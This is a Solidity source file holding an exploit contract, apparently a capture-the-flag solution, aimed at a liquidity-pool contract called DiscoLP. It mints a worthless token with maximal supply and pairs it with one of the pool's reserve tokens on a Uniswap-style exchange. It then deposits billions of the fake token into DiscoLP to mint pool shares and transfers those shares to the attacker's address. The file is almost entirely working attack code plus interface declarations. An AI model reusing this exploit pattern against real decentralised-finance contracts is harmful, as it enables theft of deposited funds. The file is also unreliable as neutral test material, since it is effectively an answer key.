pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDiscoLP {
    function depositToken(address _token, uint256 _amount, uint256 _minShares) external;
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}

contract Token2_Exploit is ERC20 {
  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public {
    _mint(msg.sender, 2**256-1);
  }
}

contract DiscoLPExploit {
    address public factory;
    address public router;
    address public disco_lp;
    address public reserve_pair;
    address public jimbo_a;
    address public jambo_b;
    address public attacker;

    using SafeMath for uint256;
    uint256 public test;

    constructor (address _factory, address _router, address _disco_lp, address _reserve_pair) public {
        factory = _factory;
        router = _router;
        disco_lp = _disco_lp;
        reserve_pair = _reserve_pair;
        attacker = msg.sender;
    }

    function exploit() public {

        jimbo_a = IUniswapV2Pair(reserve_pair).token0();
        jambo_b = IUniswapV2Pair(reserve_pair).token1();

        Token2_Exploit exp = new Token2_Exploit("Exploit Token", "EXP");

        address pair = IUniswapV2Factory(factory).createPair(address(exp), address(jimbo_a));

        IERC20(exp).approve(router, 2**256 - 1);
        IERC20(jimbo_a).approve(router, 2**256 - 1);
        (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(router).addLiquidity(
          address(exp),
          jimbo_a,
          1 * 10 ** 18,
          1 * 10 ** 18,
          1, 1, address(this), 2**256 - 1);

        IERC20(exp).approve(disco_lp, 2**256 - 1);
        IDiscoLP(disco_lp).depositToken(address(exp), 2000000000 * 10 ** 18, 1);

        // to attacker EOA
        IDiscoLP(disco_lp).transfer(attacker, IDiscoLP(disco_lp).balanceOf(address(this)));
    }
}

interface IUniswapV2Router {
  function WETH() external pure returns (address _token);
  function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
  function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
  function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
  function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
  function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
}

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint);

  function getPair(address tokenA, address tokenB) external view returns (address pair);
  function allPairs(uint) external view returns (address pair);
  function allPairsLength() external view returns (uint);

  function feeTo() external view returns (address);
  function feeToSetter() external view returns (address);

  function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}